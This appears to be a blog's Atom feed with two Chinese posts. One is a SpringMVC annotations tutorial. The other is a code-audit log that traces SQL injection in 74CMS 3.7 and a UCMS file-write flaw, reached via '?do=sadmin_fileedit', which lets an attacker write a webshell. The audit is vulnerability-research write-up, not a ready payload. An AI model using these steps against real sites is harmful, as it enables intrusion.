<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-09-23T09:29:30.758Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SpringMVC注解</title>
    <link href="http://bai-ren-1.github.io/2020/09/23/SpringMVC%E6%B3%A8%E8%A7%A3/"/>
    <id>http://bai-ren-1.github.io/2020/09/23/SpringMVC%E6%B3%A8%E8%A7%A3/</id>
    <published>2020-09-23T09:26:18.000Z</published>
    <updated>2020-09-23T09:29:30.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringMVC注解"><a href="#SpringMVC注解" class="headerlink" title="SpringMVC注解"></a>SpringMVC注解</h1><h2 id="0x00-Controller"><a href="#0x00-Controller" class="headerlink" title="0x00 @Controller"></a>0x00 @Controller</h2><p>@Controller 用于标记在一个类上，使用它标记的类就是一个SpringMVC Controller 对象。分发处理器将会扫描使用了该注解的类的方法，并检测该方法是否使用了@RequestMapping 注解。@Controller 只是定义了一个控制器类，而使用@RequestMapping 注解的方法才是真正处理请求的处理器。</p><p>@Controller 标记在一个类上还不能真正意义上的说它就是SpringMVC 的一个控制器类，因为这个时候Spring 还不认识它。这个时候就需要我们把这个控制器类交给Spring 来管理。有两种方式可以管理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--方式一--&gt;</span><br><span class="line">&lt;bean class=&quot;com.cqvie.handler.HelloWorld&quot;/&gt;</span><br><span class="line">&lt;!--方式二--&gt;</span><br><span class="line">&lt; context:component-scan base-package = &quot;com.cqvie&quot; /&gt; &lt;!-- 路径写到controller的上一层 --&gt;</span><br></pre></td></tr></table></figure><p>此外Controller 不会直接依赖于HttpServletRequest 和HttpServletResponse 等HttpServlet 对象，它们可以通过Controller 的方法参数灵活的获取到。为了先对Controller 有一个初步的印象，以下先定义一个简单的        Controller ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.handler;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/helloworld&quot;)</span><br><span class="line">    public String sayHello() &#123;</span><br><span class="line">        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-RequestMapping"><a href="#0x01-RequestMapping" class="headerlink" title="0x01 @RequestMapping"></a>0x01 @RequestMapping</h2><p>RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。</p><p>返回值会通过视图解析器解析为实际的物理视图，对于 InternalResourceViewResolver 视图解析器，会做如下的解析：<br>通过 prefix + returnVal + suffix 这样的方式得到实际的物理视图，然后做转发操作；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 配置视图解析器：如何把 handler 方法返回值解析为实际的物理视图 --&gt;</span><br><span class="line">     &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">         &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;&gt;&lt;/property&gt;</span><br><span class="line">         &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt;</span><br><span class="line">     &lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>RequestMapping注解有六个属性:</p><p><strong>1、 value</strong></p><p>value：指定请求的实际地址；</p><p><strong>2、method；</strong></p><p>method： 指定请求的method类型， GET、POST、PUT、DELETE等，下面例子的@PathVariable后面讲解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Rest 风格的 URL（以 CRUD 为例）：</span><br><span class="line">     *         新增：/order POST</span><br><span class="line">     *         修改：/order/1 PUT</span><br><span class="line">     *         获取：/order/1 GET</span><br><span class="line">     *         删除：/order/1 DELETE</span><br><span class="line">     * @param id</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(value = &quot;/testRestPut/&#123;id&#125;&quot;, method = RequestMethod.PUT)</span><br><span class="line">    public String testRestPut(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestPut:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(value = &quot;/testRestDelete/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span><br><span class="line">    public String testRestDelete(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestDelete:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(value = &quot;/testRestPost/&#123;id&#125;&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String testRestPost(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestPost:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(&quot;/testRestGet&quot;)</span><br><span class="line">    public String testRestGet() &#123;</span><br><span class="line">        System.out.println(&quot;testRestGet&quot;);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>3、consumes</strong></p><p>consumes： 指定处理请求的提交内容类型（Content-Type），例如application/json, text/html;</p><p><strong>4、produces</strong></p><p>produces:  指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回；</p><p><strong>5、params</strong></p><p>params： 指定request中必须包含某些参数值是，才让该方法处理。</p><p><strong>6、headers</strong></p><p>headers： 指定request中必须包含某些指定的header值，才能让该方法处理请求。</p><p><strong>@RequestMapping(“/helloword/?/aa”) 的 Ant 路径,匹配符：</strong><br>?：匹配文件名的一个字符<br><em>：匹配文件名的所有字符<br>*</em>：匹配多层路径</p><p><strong>@RequestMapping(“/testPojo”) POJO类用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testPojo&quot;)</span><br><span class="line">public String testPojo(User user) &#123;</span><br><span class="line">    System.out.println(&quot;testPojo:&quot; + user);</span><br><span class="line">    return &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) Map用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testMap&quot;)</span><br><span class="line">public String testMap(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">    map.put(&quot;names&quot;, Arrays.asList(&quot;Tomcat&quot;, &quot;Eclipse&quot;, &quot;JavaEE&quot;));</span><br><span class="line">    return &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) ModelAndView用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testModelAndView&quot;)</span><br><span class="line">public ModelAndView testModelAndView() &#123;</span><br><span class="line">    String viewName = SUCCESS;</span><br><span class="line">    ModelAndView modelAndView = new ModelAndView(viewName);</span><br><span class="line">    modelAndView.addObject(&quot;time&quot;, new Date());</span><br><span class="line">    return modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Resource和-Autowired"><a href="#0x02-Resource和-Autowired" class="headerlink" title="0x02 @Resource和@Autowired"></a>0x02 @Resource和@Autowired</h2><p>@Resource和@Autowired都是做bean的注入时使用，其实@Resource并不是Spring的注解，它的包是javax.annotation.Resource，需要导入，但是Spring支持该注解的注入。</p><p><strong>1、共同点</strong></p><p>两者都可以写在字段和setter方法上。两者如果都写在字段上，那么就不需要再写setter方法。</p><p><strong>2、不同点</strong></p><p>（1）@Autowired</p><p>@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123;</span><br><span class="line">    // 下面两种@Autowired只要使用一种即可</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserDao userDao; // 用于字段上</span><br><span class="line">    </span><br><span class="line">    @Autowired</span><br><span class="line">    public void setUserDao(UserDao userDao) &#123; // 用于属性的方法上</span><br><span class="line">        this.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123; 　　@Autowired 　　@Qualifier(&quot;userDao&quot;) 　　private UserDao userDao; &#125;</span><br></pre></td></tr></table></figure><p>（2）@Resource</p><p>@Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloWorld&#123;</span><br><span class="line">    // 下面两种@Resource只要使用一种即可</span><br><span class="line">    @Resource(name=&quot;userDao&quot;)</span><br><span class="line">    private UserDao userDao; // 用于字段上</span><br><span class="line">    </span><br><span class="line">    @Resource(name=&quot;userDao&quot;)</span><br><span class="line">    public void setUserDao(UserDao userDao) &#123; // 用于属性的setter方法上</span><br><span class="line">        this.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：最好是将@Resource放在setter方法上，因为这样更符合面向对象的思想，通过set、get去操作属性，而不是直接去操作属性。</p><h2 id="0x03-PathVariable"><a href="#0x03-PathVariable" class="headerlink" title="0x03 @PathVariable"></a>0x03 @PathVariable</h2><p>用于将请求URL中的模板变量映射到功能处理方法的参数上，即取出uri模板中的变量作为参数。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@Controller  </span><br><span class="line">public class TestController &#123;  </span><br><span class="line">     @RequestMapping(value=&quot;/user/&#123;userId&#125;/roles/&#123;roleId&#125;&quot;,method = RequestMethod.GET)  </span><br><span class="line">     public String getLogin(@PathVariable(&quot;userId&quot;) String userId,  </span><br><span class="line">         @PathVariable(&quot;roleId&quot;) String roleId)&#123;  </span><br><span class="line">         System.out.println(&quot;User Id : &quot; + userId);  </span><br><span class="line">         System.out.println(&quot;Role Id : &quot; + roleId);  </span><br><span class="line">         return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">     @RequestMapping(value=&quot;/product/&#123;productId&#125;&quot;,method = RequestMethod.GET)  </span><br><span class="line">     public String getProduct(@PathVariable(&quot;productId&quot;) String productId)&#123;  </span><br><span class="line">           System.out.println(&quot;Product Id : &quot; + productId);  </span><br><span class="line">           return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">     @RequestMapping(value=&quot;/javabeat/&#123;regexp1:[a-z-]+&#125;&quot;,  </span><br><span class="line">           method = RequestMethod.GET)  </span><br><span class="line">     public String getRegExp(@PathVariable(&quot;regexp1&quot;) String regexp1)&#123;  </span><br><span class="line">           System.out.println(&quot;URI Part 1 : &quot; + regexp1);  </span><br><span class="line">           return &quot;hello&quot;;  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-CookieValue"><a href="#0x04-CookieValue" class="headerlink" title="0x04 @CookieValue"></a>0x04 @CookieValue</h2><p>作用：用来获取Cookie中的值；</p><p>参数： value：参数名称  required：是否必须  defaultValue：默认值</p><p>使用案例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * 获取 Session</span><br><span class="line">     * JSESSIONID=411A032E02A2594698F6E3F4458B9CE4</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testCookieValue&quot;)</span><br><span class="line">    public String testCookieValue(@CookieValue(&quot;JSESSIONID&quot;) String sessionId) &#123;</span><br><span class="line">        System.out.println(&quot;JSESSIONID = &quot; + sessionId);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-RequestParam"><a href="#0x05-RequestParam" class="headerlink" title="0x05 @RequestParam"></a>0x05 @RequestParam</h2><p>@RequestParam用于将请求参数区数据映射到功能处理方法的参数上，用例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * @RequestParam(&quot;id&quot;) 带参映射</span><br><span class="line">     * @param id</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testRequestParam&quot;)</span><br><span class="line">    public String testRequestParam(@RequestParam(&quot;id&quot;) int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRequestParam  &quot; + id);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-SessionAttributes"><a href="#0x06-SessionAttributes" class="headerlink" title="0x06 @SessionAttributes"></a>0x06 @SessionAttributes</h2><p>@SessionAttributes即将值放到session作用域中，写在class上面。　　</p><p>@SessionAttributes 除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</p><p><em>还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）,用例：</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.SessionAttributes;</span><br><span class="line"></span><br><span class="line">import com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line">@SessionAttributes(value = &#123;&quot;user&quot;&#125;, types = &#123;String.class&#125;)</span><br><span class="line">@RequestMapping(&quot;/springmvc&quot;)</span><br><span class="line">@Controller</span><br><span class="line">public class SessionAttributesTest &#123;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * @SessionAttributes</span><br><span class="line">     *         除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</span><br><span class="line">     *         还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）。</span><br><span class="line">     * 注意： 该注解只能放在类的上面，不能放在方法上面</span><br><span class="line">     * </span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testSessionAttributes&quot;)</span><br><span class="line">    public String testSessionAttributes(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        User user = new User(1, &quot;刘邦&quot;, &quot;qwe&quot;, &quot;123&quot;, &quot;辽宁&quot;);</span><br><span class="line">        map.put(&quot;user&quot;, user);</span><br><span class="line">        map.put(&quot;school&quot;, &quot;重庆&quot;);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-ModelAttribute"><a href="#0x07-ModelAttribute" class="headerlink" title="0x07 @ModelAttribute"></a>0x07 @ModelAttribute</h2><p>代表的是：该Controller的所有方法在调用前，先执行此@ModelAttribute方法，可用于注解和方法参数中，可以把这个@ModelAttribute特性，应用在BaseController当中，所有的Controller继承BaseController，即可实现在调用Controller时，先执行@ModelAttribute方法。　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line">import com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(&quot;/springmvc&quot;)</span><br><span class="line">public class ModelAttributeTest &#123;</span><br><span class="line"></span><br><span class="line">    private static final String SUCCESS = &quot;success&quot;;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 1.有 @ModelAttribute 标记的方法，会在每个目标方法执行之前被 SpringMVC 调用</span><br><span class="line">     * 2.@ModelAttribute注解也可以修饰目标方法POJO类形的入参，其value的属性值有如下作用：</span><br><span class="line">     *     1）SpringMVC会使用value属性值在implicitModel中查找对应的对象，若存在则直接传入到目标方法的入参中</span><br><span class="line">     *     2）SpringMVC会以value为key,POJO类型的对象为value，存入的request中</span><br><span class="line">     * </span><br><span class="line">     * @param id</span><br><span class="line">     * @param map</span><br><span class="line">     */</span><br><span class="line">    @ModelAttribute</span><br><span class="line">    public void getUser(@RequestParam(value = &quot;id&quot;, required = false) int id,</span><br><span class="line">            Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">        //模拟数据库中获取对象</span><br><span class="line">        User user = new User(1, &quot;刘邦&quot;, &quot;123&quot;, &quot;023&quot;, &quot;重庆&quot;);</span><br><span class="line">        System.out.println(&quot;从数据库中获取一个对象：&quot; + user);</span><br><span class="line">        map.put(&quot;abc&quot;, user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /**</span><br><span class="line">     * 运行流程：</span><br><span class="line">     *         1.执行@ModelAttribute注解修饰的方法，从数据库中取出对象，把对象放入Map中，键为：user；</span><br><span class="line">     *         2.SpringMVC从Map中取出User对象，并把表单的请求参数赋值给该User对象的对应属性；</span><br><span class="line">     *         3.SpringMVC把上述对象传入目标方法的参数。</span><br><span class="line">     * </span><br><span class="line">     * 注意：在@ModelAttribute修饰的方法中，放入到Map时的键需要和目标方法入参类型的第一个字母小写的字符串一致</span><br><span class="line">     * </span><br><span class="line">     * @param user</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(&quot;/testModelAttribute&quot;)</span><br><span class="line">    public String testModelAttribute(@ModelAttribute(&quot;abc&quot;) User user) &#123;</span><br><span class="line">        System.out.println(&quot;修改：&quot; + user);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-ResponseBody"><a href="#0x08-ResponseBody" class="headerlink" title="0x08 @ResponseBody　"></a>0x08 @ResponseBody　</h2><p>作用： 该注解用于将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。</p><p>使用时机：返回的数据不是html标签的页面，而是其他某种格式的数据时（如json、xml等）使用；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringMVC注解&quot;&gt;&lt;a href=&quot;#SpringMVC注解&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC注解&quot;&gt;&lt;/a&gt;SpringMVC注解&lt;/h1&gt;&lt;h2 id=&quot;0x00-Controller&quot;&gt;&lt;a href=&quot;#0x
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>审计记录</title>
    <link href="http://bai-ren-1.github.io/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <id>http://bai-ren-1.github.io/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</id>
    <published>2020-09-18T08:11:09.000Z</published>
    <updated>2020-11-18T08:23:19.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="审计记录"><a href="#审计记录" class="headerlink" title="审计记录"></a>审计记录</h2><p>记录，有时间就慢慢补充。</p><h2 id="0x00-74CMS"><a href="#0x00-74CMS" class="headerlink" title="0x00 74CMS"></a>0x00 74CMS</h2><p>3.7版本，自己上官网搜索。关注SQL注入，全局搜索select函数观察sql语句：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/1.png" alt></p><p>跟进第67处sql语句，发现直接拼接参数变量id：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/2.png" alt></p><p>这个直接拼接的sql语句是在get_color_one中写的，于是我们全局搜索get_color_one方法：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/3.png" alt></p><p>明显只有1、2、5三处是调用了这个方法，我们跟进第一个：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/4.png" alt></p><p>直接拼接GET参数，中奖了。跟进第二个:</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/5.png" alt></p><p>也是直接拼接POST参数，再次中奖。跟进第三个：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/6.png" alt></p><p>这里获取val变量后使用intval进行转换，可见不能进行注入了。</p><h2 id="0x01-UCMS"><a href="#0x01-UCMS" class="headerlink" title="0x01 UCMS"></a>0x01 UCMS</h2><p>文件操作导致写shell的命令执行，记录一下。去CNVD上看到这个漏洞：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/7.png" alt></p><p>全局搜索fopen：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/8.png" alt></p><p>跟进最后一项，发现可以操作：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/9.png" alt></p><p>里面就是根据$alldir和$filename变量打开文件并且往其中写入$content（$content的内容是我们POST直接可控的）。然后我们看上面需要什么限定：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/10.png" alt></p><p>发现$alldir和$filename变量都是我们GET直接可控的，并且需要赋值才能走到我们下面的利用点。然后最开始的要求就是要“定义了admin”。我们就看到入口文件index.php：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/11.png" alt></p><p>看到了我们定义了admin的语句啦，就说明我们不能直接访问上面的fileedit.php，否则就会admin没定义而exit；我们需要在定义了admin的index.php从找到如何进入fileedit.php：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/12.png" alt></p><p>直接提交GET参数do，然后就会根据_符号进行分割。其中分割后所得的前半部分是路径，后半部分是文件名，然后将路径和文件名得到的文件包含进来。那我们为了包含上面的fileedit.php，就得构造?do=sadmin_fileedit的参数。</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/13.png" alt></p><p>上面这样构造后就会在index.php满足中路由到sadmin/fileedit.php，然后打开根目录下的/1.php文件，检查完post中的token后就往1.php中写入post中的co，达成我们要的目的。</p><blockquote><p>这里不知道为什么我一开始直接构造post包提交后一直没有反应。得我重新在fileedit页面抓包后重新构造payload发送后才有反应？一开始我是复现不出来的。</p></blockquote><p>最后在根目录就能看到写入的文件，这里完全可以写成一个webshell：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/14.png" alt></p><p>记得进入写文件操作前有个checktoken的检查方法，得把token放在POST内容上。否则提示非法：</p><p><img src="/2020/09/18/%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/15.png" alt></p><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/" target="_blank" rel="noopener">https://sunian19.github.io/2020/09/08/UCMS%20v.1.4.8%20Command%20execution/</a></p>]]></content>
    
    <summary type="html">
    
      
      
